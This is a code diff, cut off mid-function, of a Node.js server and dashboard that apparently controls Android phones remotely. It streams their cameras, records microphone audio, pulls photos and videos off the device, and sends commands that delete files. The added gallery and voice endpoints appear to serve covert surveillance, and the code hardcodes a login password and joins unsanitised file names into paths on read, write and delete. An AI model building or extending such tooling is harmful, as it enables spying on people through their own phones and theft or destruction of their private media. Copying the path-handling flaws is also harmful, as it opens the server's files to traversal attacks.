@@ -3,6 +3,8 @@ const http = require('http');
 const socketIo = require('socket.io');
 const cors = require('cors');
 const crypto = require('crypto');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const server = http.createServer(app);
@@ -14,6 +16,15 @@ const io = socketIo(server, {
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
+
+// ========== GALLERY STORAGE ==========
+const GALLERY_DIR = path.join(__dirname, 'gallery');
+if (!fs.existsSync(GALLERY_DIR)) {
+    fs.mkdirSync(GALLERY_DIR, { recursive: true });
+}
+
+// Store gallery metadata in memory (or JSON file for persistence)
+let galleryData = {}; // { deviceId: [ {name, type, size, date, path} ] }
 
 // ========== AUTH ==========
 const DASHBOARD_PASSWORD = 'ajaybabu95';
@@ -40,8 +51,6 @@ let latestFrames = {};
 let deviceSettings = {};
 let activeStreams = {};
 let frameQueues = {};
-let voiceStreams = {};
-let voiceDataQueue = {};
 
 function getDeviceSettings(deviceId) {
     if (!deviceSettings[deviceId]) {
@@ -78,7 +87,7 @@ function resolveLatestFrame(deviceId) {
     return bestFrame || null;
 }
 
-// Cleanup stale devices every 15s (lastSeen > 60s AND no recent frames)
+// Cleanup stale devices every 15s
 setInterval(() => {
     const now = Date.now();
     devices = devices.filter(device => {
@@ -161,7 +170,233 @@ app.post('/api/heartbeat', (req, res) => {
     }
 });
 
-// FRAME UPLOAD (Single - HTTP fallback)
+// ========== GALLERY API ==========
+
+// ✅ Receive gallery metadata from Android
+app.post('/api/sync/gallery', (req, res) => {
+    try {
+        const { deviceId, files, count } = req.body;
+        console.log(`📸 Gallery sync: ${count} files from ${deviceId}`);
+
+        if (!deviceId) {
+            return res.status(400).json({ success: false, error: 'Missing deviceId' });
+        }
+
+        // Store metadata
+        galleryData[deviceId] = files.map(f => ({
+            name: f.name,
+            type: f.type,
+            size: f.size,
+            date: f.date || Date.now(),
+            path: f.path || f.name
+        }));
+
+        // Create device folder
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        if (!fs.existsSync(deviceDir)) {
+            fs.mkdirSync(deviceDir, { recursive: true });
+        }
+
+        console.log(`✅ Gallery metadata saved: ${files.length} files for ${deviceId}`);
+        res.json({ success: true, count: files.length });
+
+    } catch (e) {
+        console.error('❌ Gallery sync error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ✅ Get gallery metadata for a device
+app.get('/api/gallery/:deviceId', (req, res) => {
+    try {
+        const { deviceId } = req.params;
+        const files = galleryData[deviceId] || [];
+        
+        // Sort by date (newest first)
+        files.sort((a, b) => (b.date || 0) - (a.date || 0));
+
+        const device = devices.find(d => d.id === deviceId);
+        const deviceName = device ? device.name : deviceId;
+
+        res.json({
+            success: true,
+            deviceId: deviceId,
+            deviceName: deviceName,
+            files: files,
+            count: files.length,
+            images: files.filter(f => f.type === 'image').length,
+            videos: files.filter(f => f.type === 'video').length
+        });
+
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ✅ Get single file (on-demand fetch from Android)
+app.get('/api/gallery/file/:deviceId/:fileName', (req, res) => {
+    try {
+        const { deviceId, fileName } = req.params;
+        
+        // Check if file exists locally
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        const filePath = path.join(deviceDir, fileName);
+        
+        if (fs.existsSync(filePath)) {
+            // Serve from cache
+            const data = fs.readFileSync(filePath);
+            const base64 = data.toString('base64');
+            const ext = path.extname(fileName).toLowerCase();
+            const type = ['.jpg','.jpeg','.png','.gif','.webp'].includes(ext) ? 'image' : 'video';
+            
+            return res.json({
+                success: true,
+                name: fileName,
+                type: type,
+                data: base64,
+                cached: true
+            });
+        }
+
+        // Not cached - request from device
+        console.log(`📤 Requesting file from device: ${fileName}`);
+        
+        // Queue command for device
+        const cmd = { command: 'gallery_file', value: fileName };
+        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+        pendingCommands[deviceId].push(cmd);
+
+        // Return pending status - device will upload via /api/upload/file
+        res.json({
+            success: false,
+            pending: true,
+            message: 'Requesting file from device...'
+        });
+
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ✅ Upload single file from Android (for gallery)
+app.post('/api/upload/file', (req, res) => {
+    try {
+        const { deviceId, file } = req.body;
+        
+        if (!deviceId || !file || !file.name || !file.data) {
+            return res.status(400).json({ success: false, error: 'Missing file data' });
+        }
+
+        console.log(`📤 File uploaded: ${file.name} from ${deviceId} (${file.size} bytes)`);
+
+        // Create device folder
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        if (!fs.existsSync(deviceDir)) {
+            fs.mkdirSync(deviceDir, { recursive: true });
+        }
+
+        // Save file
+        const filePath = path.join(deviceDir, file.name);
+        const buffer = Buffer.from(file.data, 'base64');
+        fs.writeFileSync(filePath, buffer);
+
+        // Update metadata
+        if (!galleryData[deviceId]) {
+            galleryData[deviceId] = [];
+        }
+        
+        // Check if file already exists in metadata
+        const existing = galleryData[deviceId].find(f => f.name === file.name);
+        if (!existing) {
+            galleryData[deviceId].push({
+                name: file.name,
+                type: file.type || 'image',
+                size: file.size || buffer.length,
+                date: file.date || Date.now(),
+                path: file.name
+            });
+        }
+
+        res.json({
+            success: true,
+            message: `File saved: ${file.name}`,
+            size: buffer.length
+        });
+
+    } catch (e) {
+        console.error('❌ Upload error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ✅ Delete file
+app.delete('/api/gallery/file/:deviceId/:fileName', (req, res) => {
+    try {
+        const { deviceId, fileName } = req.params;
+        
+        // Delete from filesystem
+        const deviceDir = path.join(GALLERY_DIR, deviceId);
+        const filePath = path.join(deviceDir, fileName);
+        
+        if (fs.existsSync(filePath)) {
+            fs.unlinkSync(filePath);
+            console.log(`🗑️ Deleted file: ${fileName}`);
+        }
+
+        // Remove from metadata
+        if (galleryData[deviceId]) {
+            galleryData[deviceId] = galleryData[deviceId].filter(f => f.name !== fileName);
+        }
+
+        // Send delete command to device
+        const cmd = { command: 'gallery_delete', value: fileName };
+        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
+        pendingCommands[deviceId].push(cmd);
+
+        res.json({ success: true });
+
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== VOICE API ==========
+
+// ✅ Receive voice data from Android
+app.post('/api/voice/data', (req, res) => {
+    try {
+        const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;
+        
+        if (!deviceId || !audio || audio.length === 0) {
+            return res.status(400).json({ success: false, error: 'Missing audio data' });
+        }
+
+        console.log(`🎤 Voice data: ${count} chunks from ${deviceId}`);
+
+        // Create device voice folder
+        const voiceDir = path.join(GALLERY_DIR, deviceId, 'voice');
+        if (!fs.existsSync(voiceDir)) {
+            fs.mkdirSync(voiceDir, { recursive: true });
+        }
+
+        // Save audio chunks
+        audio.forEach((chunk, index) => {
+            const fileName = `voice_${timestamp}_${index}.pcm`;
+            const filePath = path.join(voiceDir, fileName);
+            const buffer = Buffer.from(chunk, 'base64');
+            fs.writeFileSync(filePath, buffer);
+        });
+
+        res.json({ success: true });
+
+    } catch (e) {
+        console.error('❌ Voice error:', e.message);
+        res.status(500).json({ success: false, error: e.message });
+    }
+});
+
+// ========== FRAME API ==========
+
 app.post('/api/frame', (req, res) => {
     try {
         const { deviceId, image, quality, fps, camera } = req.body;
@@ -193,7 +428,6 @@ app.post('/api/frame', (req, res) => {
     }
 });
 
-// BATCH UPLOAD (5 frames at a time)
 app.post('/api/batch', (req, res) => {
     try {
         const { deviceId, frames, count, timestamp, fps, quality } = req.body;
@@ -237,7 +471,6 @@ app.post('/api/batch', (req, res) => {
             });
         }
 
-        // Auto-register device if not already in list (batch-only devices skip heartbeat)
         let dev = devices.find(d => d.id === deviceId);
         if (!dev) {
             dev = {
@@ -265,7 +498,6 @@ app.post('/api/batch', (req, res) => {
     }
 });
 
-// FRAME FETCH
 app.get('/api/frame/:deviceId', (req, res) => {
     const { deviceId } = req.params;
 
@@ -280,7 +512,6 @@ app.get('/api/frame/:deviceId', (req, res) => {
     res.json({ success: true, image: frame.image, ts: frame.ts });
 });
 
-// FLIP CAMERA (explicit front/back)
 app.post('/api/flip', (req, res) => {
     try {
         const { deviceId, camera } = req.body;
@@ -304,89 +535,11 @@ app.post('/api/flip', (req, res) => {
     }
 });
 
-// ========== VOICE COMMANDS ==========
-
-app.post('/api/voice/start', (req, res) => {
-    try {
-        const { deviceId } = req.body;
-        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_start', value: 'true' });
-        voiceStreams[deviceId] = { active: true, startedAt: Date.now(), packetsReceived: 0 };
-        console.log(`🎙️ Voice START queued for ${deviceId}`);
-        res.json({ success: true, command: 'voice_start', status: 'started' });
-    } catch (e) {
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-app.post('/api/voice/stop', (req, res) => {
-    try {
-        const { deviceId } = req.body;
-        if (!deviceId) return res.status(400).json({ success: false, error: 'deviceId required' });
-        if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
-        pendingCommands[deviceId].push({ command: 'voice_stop', value: 'false' });
-        if (voiceStreams[deviceId]) { voiceStreams[deviceId].active = false; voiceStreams[deviceId].stoppedAt = Date.now(); }
-        console.log(`⏹️ Voice STOP queued for ${deviceId}`);
-        res.json({ success: true, command: 'voice_stop', status: 'stopped' });
-    } catch (e) {
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-app.get('/api/voice/status/:deviceId', (req, res) => {
-    const { deviceId } = req.params;
-    res.json({
-        success: true, deviceId,
-        isActive: voiceStreams[deviceId]?.active || false,
-        hasPendingCommand: pendingCommands[deviceId]?.some(c => c.command === 'voice_start' || c.command === 'voice_stop') || false,
-        packetsReceived: voiceStreams[deviceId]?.packetsReceived || 0,
-        startedAt: voiceStreams[deviceId]?.startedAt || null,
-        stoppedAt: voiceStreams[deviceId]?.stoppedAt || null
-    });
-});
-
-app.post('/api/voice/data', (req, res) => {
-    try {
-        const { deviceId, audio, count, timestamp, codec, sampleRate, channels } = req.body;
-
-        console.log(`🎙️ Voice data from ${deviceId}: ${count} packets`);
-        console.log(`📊 Codec: ${codec || 'pcm'}, Sample Rate: ${sampleRate || 8000}`);
-
-        if (!deviceId) {
-            return res.status(400).json({ success: false, error: 'deviceId required' });
-        }
-
-        if (!audio || audio.length === 0) {
-            return res.status(400).json({ success: false, error: 'No audio data' });
-        }
-
-        io.emit('voice_data', {
-            deviceId: deviceId,
-            audio: audio,
-            count: count || audio.length,
-            timestamp: timestamp || Date.now(),
-            codec: codec || 'pcm',
-            sampleRate: sampleRate || 8000,
-            channels: channels || 1
-        });
-
-        console.log(`✅ Voice broadcasted to ${io.engine.clientsCount} clients`);
-        res.json({ success: true, packetsReceived: audio.length });
-
-    } catch (e) {
-        console.error('❌ Voice error:', e.message);
-        res.status(500).json({ success: false, error: e.message });
-    }
-});
-
-// COMMAND SEND
 app.post('/api/command', (req, res) => {
     try {
         const { deviceId, command, value } = req.body;
         console.log(`📨 HTTP Command: [${command}] for [${deviceId}]`);
 
-        // Update deviceSettings so heartbeat returns correct values
         const ds = getDeviceSettings(deviceId);
         switch (command) {
             case 'start':   ds.stream = true; break;
@@ -397,7 +550,6 @@ app.post('/api/command', (req, res) => {
             default: console.log(`⚠️ Unknown command: ${command}`);
         }
 
-        // Store full command object with value
         const cmd = { command, value: value ?? null };
         if (deviceId) {
             if (!pendingCommands[deviceId]) pendingCommands[deviceId] = [];
@@ -411,7 +563,6 @@ app.post('/api/command', (req, res) => {
     }
 });
 
-// COMMAND POLL (Android polls this)
 app.get('/api/commands/:deviceId', (req, res) => {
     try {
         const { deviceId } = req.params;
@@ -427,14 +578,13 @@ app.get('/api/commands/:deviceId', (req, res) => {
         res.json({
             success: true,
             settings: getDeviceSettings(deviceId),
-            commands: cmds  // Full command objects with value
+            commands: cmds
         });
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
 });
 
-// DEVICE STATUS UPDATE
 app.post('/api/device-status', (req, res) => {
     try {
         const { deviceId, cameraReady, streaming, cameraType, cameraPermission, status } = req.body;
@@ -453,7 +603,6 @@ app.post('/api/device-status', (req, res) => {
     }
 });
 
-// DEVICES LIST
 app.get('/api/devices', (req, res) => {
     const now = Date.now();
     res.json({
@@ -471,12 +620,12 @@ app.get('/api/devices', (req, res) => {
             hasWebSocket: !!activeStreams[d.id],
             lastHeartbeat: d.lastHeartbeat,
             connectedAt: d.connectedAt,
+            galleryCount: (galleryData[d.id] || []).length,
             settings: getDeviceSettings(d.id)
         }))
     });
 });
 
-// DEVICE DETAIL
 app.get('/api/device/:deviceId', (req, res) => {
     const device = devices.find(d => d.id === req.params.deviceId);
     if (!device) return res.status(404).json({ success: false, error: 'Not found' });
@@ -487,22 +636,22 @@ app.get('/api/device/:deviceId', (req, res) => {
             ...device,
             isConnected: (now - (device.lastSeen || 0)) < 60000,
             hasWebSocket: !!activeStreams[device.id],
+            galleryCount: (galleryData[device.id] || []).length,
             settings: getDeviceSettings(device.id)
         }
     });
 });
 
-// HEALTH
 app.get('/api/health', (req, res) => res.json({
     status: 'ok',
     devices: devices.length,
     uptime: process.uptime(),
     frames: Object.keys(latestFrames).length,
     batchFrames: Object.keys(frameQueues).reduce((acc, key) => acc + (frameQueues[key]?.length || 0), 0),
-    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0)
+    commands: Object.keys(pendingCommands).reduce((acc, key) => acc + pendingCommands[key].length, 0),
+    galleryFiles: Object.keys(galleryData).reduce((acc, key) => acc + (galleryData[key]?.length || 0), 0)
 }));
 
-// DEBUG
 app.get('/api/debug', (req, res) => {
     res.json({
         devices: devices.map(d => d.id),
@@ -512,13 +661,16 @@ app.get('/api/debug', (req, res) => {
             acc[key] = frameQueues[key]?.length || 0;
             return acc;
         }, {}),
+        galleryData: Object.keys(galleryData).reduce((acc, key) => {
+            acc[key] = galleryData[key]?.length || 0;
+            return acc;
+        }, {}),
         heartbeats: Object.fromEntries(
             Object.entries(deviceHeartbeats).map(([k, v]) => [k, `${Math.round((Date.now() - v) / 1000)}s ago`])
         )
     });
 });
 
-// LOGIN API (for Android app)
 app.post('/api/login', (req, res) => {
     const { password } = req.body;
     if (password === DASHBOARD_PASSWORD) {
@@ -573,7 +725,8 @@ io.on('connection', (socket) => {
             batteryOptimization: device.batteryOptimization || false,
             batteryPercentage: device.batteryPercentage || 0,
             isConnected: true, hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt
+            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
+            galleryCount: (galleryData[device.id] || []).length
         });
     });
 
@@ -600,7 +753,8 @@ io.on('connection', (socket) => {
             batteryOptimization: device.batteryOptimization || false,
             batteryPercentage: device.batteryPercentage || 0,
             isConnected: true, hasWebSocket: true,
-            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt
+            lastHeartbeat: device.lastHeartbeat, connectedAt: device.connectedAt,
+            galleryCount: (galleryData[device.id] || []).length
         });
     });
 
@@ -658,7 +812,6 @@ io.on('connection', (socket) => {
         }
     });
 
-    // Dashboard sends command via WebSocket
     socket.on('send_command', (data) => {
         const { deviceId, command, value } = data;
 
@@ -691,7 +844,7 @@ io.on('connection', (socket) => {
                     console.log(`📴 Device [${disconnectedId}] WS stream ended`);
                 }
             }, 8000);
-            console.log(`⚠️  Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
+            console.log(`⚠️ Device [${disconnectedId}] WS drop — waiting 8s for reconnect`);
         } else {
             console.log(`🔌 WS client disconnected: ${socket.id}`);
         }
@@ -762,7 +915,7 @@ app.get('/', requireAuth, (req, res) => {
         * { margin:0; padding:0; box-sizing:border-box; }
         body { font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; min-height:100vh; padding:20px; color:#fff; }
         .container { max-width:600px; margin:0 auto; }
-        .header { text-align:center; margin-bottom:20px; }
+        .header { text-align:center; margin-bottom:20px; position:relative; }
         .header h1 { font-size:24px; background:linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
         .header p { font-size:12px; color:#666; margin-top:5px; }
         .stats { display:grid; grid-template-columns:repeat(3,1fr); gap:12px; margin-bottom:20px; }
@@ -801,15 +954,6 @@ app.get('/', requireAuth, (req, res) => {
         .btn-front { background:#2196F3; color:white; } .btn-front:hover { background:#0b7dda; }
         .btn-back  { background:#9C27B0; color:white; } .btn-back:hover  { background:#7B1FA2; }
         .btn-front.active-cam, .btn-back.active-cam { outline:3px solid #fff; transform:scale(1.06); }
-        .btn-voice-start { background:linear-gradient(135deg,#FF6B35,#F7C59F); color:#1a1a1a; font-weight:700; }
-        .btn-voice-start:hover { opacity:.88; }
-        .btn-voice-stop  { background:linear-gradient(135deg,#c62828,#e53935); color:white; }
-        .btn-voice-stop:hover  { opacity:.88; }
-        .voice-card { background:#1a1a1a; border-radius:16px; padding:16px; margin-bottom:20px; border:1px solid #2a2a2a; }
-        .voice-status { display:flex; align-items:center; gap:8px; font-size:13px; color:#888; margin-top:10px; }
-        .voice-dot { width:8px; height:8px; border-radius:50%; background:#555; transition:all .3s; }
-        .voice-dot.active { background:#4CAF50; box-shadow:0 0 8px #4CAF50; animation:pulse 1s infinite; }
-        @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:.4;} }
         .quality-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:20px; }
         .quality-btn { padding:10px; border:1px solid #2a2a2a; background:#0a0a0a; color:#fff; border-radius:10px; cursor:pointer; font-size:12px; text-align:center; }
         .quality-btn.active { background:#667eea; border-color:#667eea; }
@@ -842,6 +986,41 @@ app.get('/', requireAuth, (req, res) => {
         .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
         .logout-btn:hover { border-color:#f44336; color:#f44336; }
         .header { position:relative; }
+
+        /* Gallery CSS */
+        .gallery-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.92); z-index:3000; overflow-y:auto; padding:20px; }
+        .gallery-modal.active { display:block; }
+        .gallery-header { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; margin-bottom:20px; position:sticky; top:0; background:rgba(0,0,0,.9); z-index:10; padding:15px 0; }
+        .gallery-header h2 { font-size:20px; }
+        .gallery-close { background:none; border:none; color:#fff; font-size:28px; cursor:pointer; padding:0 10px; }
+        .gallery-close:hover { color:#f44336; }
+        .gallery-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(150px,1fr)); gap:12px; padding-bottom:30px; }
+        .gallery-item { background:#1a1a1a; border-radius:12px; overflow:hidden; border:1px solid #2a2a2a; cursor:pointer; transition:all .2s; }
+        .gallery-item:hover { transform:scale(1.03); border-color:#667eea; }
+        .gallery-item img { width:100%; height:150px; object-fit:cover; display:block; }
+        .gallery-item .gallery-item-info { padding:8px 10px; }
+        .gallery-item .gallery-item-name { font-size:11px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+        .gallery-item .gallery-item-size { font-size:10px; color:#666; }
+        .gallery-item.video-item { position:relative; }
+        .gallery-item.video-item::after { content:'▶'; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:40px; color:rgba(255,255,255,.8); text-shadow:0 0 20px rgba(0,0,0,.8); }
+        .gallery-loading { text-align:center; color:#666; padding:40px; }
+        .gallery-empty { text-align:center; color:#666; padding:40px; }
+        .gallery-empty span { font-size:48px; display:block; margin-bottom:10px; }
+        .gallery-back { background:none; border:1px solid #444; color:#aaa; padding:8px 16px; border-radius:8px; cursor:pointer; font-size:13px; transition:all .2s; }
+        .gallery-back:hover { border-color:#667eea; color:#fff; }
+        .gallery-stats { font-size:13px; color:#888; }
+
+        /* Image Viewer Modal */
+        .image-viewer { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,.95); z-index:4000; align-items:center; justify-content:center; flex-direction:column; }
+        .image-viewer.active { display:flex; }
+        .image-viewer img { max-width:95%; max-height:80vh; object-fit:contain; border-radius:8px; }
+        .image-viewer .viewer-controls { display:flex; gap:20px; margin-top:20px; align-items:center; flex-wrap:wrap; justify-content:center; }
+        .image-viewer .viewer-btn { background:rgba(255,255,255,.1); border:1px solid #444; color:#fff; padding:10px 20px; border-radius:10px; cursor:pointer; font-size:14px; transition:all .2s; }
+        .image-viewer .viewer-btn:hover { background:#667eea; border-color:#667eea; }
+        .image-viewer .viewer-btn.danger:hover { background:#f44336; border-color:#f44336; }
+        .image-viewer .viewer-close { position:absolute; top:20px; right:30px; background:none; border:none; color:#fff; font-size:36px; cursor:pointer; }
+        .image-viewer .viewer-close:hover { color:#f44336; }
+        .image-viewer .viewer-info { color:#888; font-size:13px; margin-top:10px; text-align:center; }
     </style>
 </head>
 <body>
@@ -877,41 +1056,38 @@ app.get('/', requireAuth, (req, res) => {
         <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
         <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
     </div>
-    <div class="voice-card">
-        <div class="section-title">🎙️ PCM AUDIO PLAYER</div>
-        <div class="button-group" style="margin-bottom:8px;">
-            <button class="btn btn-voice-start" id="voiceStartBtn">🎙️ START LISTEN</button>
-            <button class="btn btn-voice-stop" id="voiceStopBtn">⏹ STOP</button>
-        </div>
-        <div class="voice-status">
-            <div class="voice-dot" id="voiceDot"></div>
-            <span id="voiceStatusText">Idle</span>
-            <span id="voicePacketCount" style="margin-left:auto;font-size:11px;color:#555;"></span>
-        </div>
-        <div style="margin-top:8px;display:flex;align-items:center;gap:8px;">
-            <span style="font-size:11px;color:#888;">VOL</span>
-            <input type="range" id="voiceVolume" min="0" max="200" value="100" step="5"
-                style="flex:1;accent-color:#4CAF50;cursor:pointer;">
-            <span id="voiceVolLabel" style="font-size:11px;color:#aaa;width:34px;">100%</span>
-        </div>
-        <div style="margin-top:8px;background:#1a1a1a;border-radius:6px;height:28px;overflow:hidden;position:relative;">
-            <div id="voiceLevelBar" style="height:100%;width:0%;background:linear-gradient(90deg,#4CAF50,#8BC34A);border-radius:6px;transition:width 0.08s;"></div>
-            <span style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:10px;color:#555;pointer-events:none;">AUDIO LEVEL</span>
-        </div>
-        <div style="margin-top:6px;font-size:10px;color:#444;display:flex;justify-content:space-between;">
-            <span id="voiceCodecInfo">PCM 16-bit LE</span>
-            <span id="voiceSampleRateInfo">– Hz</span>
-            <span id="voiceLatencyInfo">latency –</span>
-        </div>
-    </div>
     <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
 </div>
-<div id="statusModal" class="status-modal">
-    <div class="status-modal-content">
-        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
-        <div id="modalContent"></div>
+
+<!-- GALLERY MODAL -->
+<div class="gallery-modal" id="galleryModal">
+    <div class="gallery-header">
+        <div>
+            <button class="gallery-back" onclick="closeGallery()">← Back</button>
+            <span style="margin-left:15px;font-size:18px;" id="galleryDeviceName">Gallery</span>
+            <span class="gallery-stats" id="galleryStats" style="margin-left:12px;"></span>
+        </div>
+        <button class="gallery-close" onclick="closeGallery()">✕</button>
+    </div>
+    <div id="galleryContent">
+        <div class="gallery-loading">⏳ Loading gallery...</div>
     </div>
 </div>
+
+<!-- IMAGE VIEWER -->
+<div class="image-viewer" id="imageViewer">
+    <button class="viewer-close" onclick="closeImageViewer()">✕</button>
+    <img id="viewerImage" src="" alt="Image">
+    <div class="viewer-controls">
+        <button class="viewer-btn" onclick="prevImage()">◀ Prev</button>
+        <span id="viewerCounter" style="color:#888;font-size:13px;">1/1</span>
+        <button class="viewer-btn" onclick="nextImage()">Next ▶</button>
+        <button class="viewer-btn" onclick="downloadImage()">⬇ Download</button>
+        <button class="viewer-btn danger" onclick="deleteImage()">🗑 Delete</button>
+    </div>
+    <div class="viewer-info" id="viewerInfo"></div>
+</div>
+
 <script src="/socket.io/socket.io.js"></script>
 <script>
     const socket = io({ transports: ['websocket', 'polling'] });
@@ -950,6 +1126,10 @@ app.get('/', requireAuth, (req, res) => {
     let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
     let userStoppedStream = false;
     let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
+
+    // Gallery variables
+    let currentGalleryFiles = [];
+    let currentViewerIndex = 0;
 
     const video = document.getElementById('video'),
           placeholder = document.getElementById('placeholder'),
@@ -1014,6 +1194,186 @@ app.get('/', requireAuth, (req, res) => {
             }).catch(() => {});
         }
     }
+
+    // ========== GALLERY FUNCTIONS ==========
+
+    function openGallery(deviceId) {
+        const device = currentDevices.find(d => d.id === deviceId);
+        if (!device) {
+            alert('Device not found');
+            return;
+        }
+
+        document.getElementById('galleryDeviceName').textContent = '📱 ' + device.name;
+        document.getElementById('galleryModal').classList.add('active');
+        document.getElementById('galleryContent').innerHTML = '<div class="gallery-loading">⏳ Loading gallery...</div>';
+
+        // Fetch gallery metadata
+        fetch('/api/gallery/' + deviceId)
+            .then(r => r.json())
+            .then(data => {
+                if (data.success) {
+                    currentGalleryFiles = data.files || [];
+                    document.getElementById('galleryStats').textContent = 
+                        data.images + ' images • ' + data.videos + ' videos • ' + data.count + ' total';
+                    renderGallery(data.files);
+                } else {
+                    document.getElementById('galleryContent').innerHTML = 
+                        '<div class="gallery-empty"><span>📭</span>No files found</div>';
+                }
+            })
+            .catch(err => {
+                document.getElementById('galleryContent').innerHTML = 
+                    '<div class="gallery-empty"><span>❌</span>Error loading gallery</div>';
+            });
+    }
+
+    function renderGallery(files) {
+        if (!files || files.length === 0) {
+            document.getElementById('galleryContent').innerHTML = 
+                '<div class="gallery-empty"><span>📭</span>No files found</div>';
+            return;
+        }
+
+        let html = '<div class="gallery-grid">';
+        files.forEach((file, index) => {
+            const isVideo = file.type === 'video';
+            const sizeMB = (file.size / (1024 * 1024)).toFixed(1);
+            const date = new Date(file.date).toLocaleDateString();
+            
+            // Check if file is cached locally (exists on server)
+            const isCached = false; // Will check via API call
+            
+            html += \`
+                <div class="gallery-item \${isVideo ? 'video-item' : ''}" onclick="openImageViewer(\${index})">
+                    <div style="background:#1a1a1a;height:150px;display:flex;align-items:center;justify-content:center;font-size:48px;color:#555;">
+                        \${isVideo ? '🎬' : '📷'}
+                    </div>
+                    <div class="gallery-item-info">
+                        <div class="gallery-item-name">\${file.name}</div>
+                        <div class="gallery-item-size">\${sizeMB}MB • \${date}</div>
+                    </div>
+                </div>
+            \`;
+        });
+        html += '</div>';
+        document.getElementById('galleryContent').innerHTML = html;
+    }
+
+    function openImageViewer(index) {
+        if (!currentGalleryFiles || currentGalleryFiles.length === 0) return;
+        currentViewerIndex = index;
+        loadImageForViewer(index);
+        document.getElementById('imageViewer').classList.add('active');
+    }
+
+    function loadImageForViewer(index) {
+        const file = currentGalleryFiles[index];
+        if (!file) return;
+
+        document.getElementById('viewerCounter').textContent = (index + 1) + '/' + currentGalleryFiles.length;
+        document.getElementById('viewerInfo').textContent = file.name + ' • ' + 
+            (file.size / (1024 * 1024)).toFixed(1) + 'MB • ' + new Date(file.date).toLocaleString();
+
+        // Fetch file from server
+        const deviceId = document.getElementById('galleryDeviceName').textContent.replace('📱 ', '');
+        const device = currentDevices.find(d => d.name === deviceId || d.id === deviceId);
+        const realDeviceId = device ? device.id : deviceId;
+
+        document.getElementById('viewerImage').src = '';
+        document.getElementById('viewerImage').alt = 'Loading...';
+
+        fetch('/api/gallery/file/' + realDeviceId + '/' + encodeURIComponent(file.name))
+            .then(r => r.json())
+            .then(data => {
+                if (data.success && data.data) {
+                    const src = 'data:' + (file.type === 'image' ? 'image/jpeg' : 'video/mp4') + ';base64,' + data.data;
+                    document.getElementById('viewerImage').src = src;
+                    document.getElementById('viewerImage').alt = file.name;
+                } else if (data.pending) {
+                    document.getElementById('viewerImage').alt = '⏳ Requesting from device...';
+                    // Check again after 3 seconds
+                    setTimeout(() => loadImageForViewer(index), 3000);
+                } else {
+                    document.getElementById('viewerImage').alt = '❌ Failed to load';
+                }
+            })
+            .catch(() => {
+                document.getElementById('viewerImage').alt = '❌ Error loading';
+            });
+    }
+
+    function closeImageViewer() {
+        document.getElementById('imageViewer').classList.remove('active');
+    }
+
+    function prevImage() {
+        if (currentViewerIndex > 0) {
+            loadImageForViewer(currentViewerIndex - 1);
+            currentViewerIndex--;
+        }
+    }
+
+    function nextImage() {
+        if (currentViewerIndex < currentGalleryFiles.length - 1) {
+            loadImageForViewer(currentViewerIndex + 1);
+            currentViewerIndex++;
+        }
+    }
+
+    function downloadImage() {
+        const img = document.getElementById('viewerImage');
+        if (img.src) {
+            const link = document.createElement('a');
+            link.href = img.src;
+            link.download = currentGalleryFiles[currentViewerIndex]?.name || 'image';
+            link.click();
+        }
+    }
+
+    function deleteImage() {
+        if (!confirm('Delete this file?')) return;
+        const file = currentGalleryFiles[currentViewerIndex];
+        if (!file) return;
+
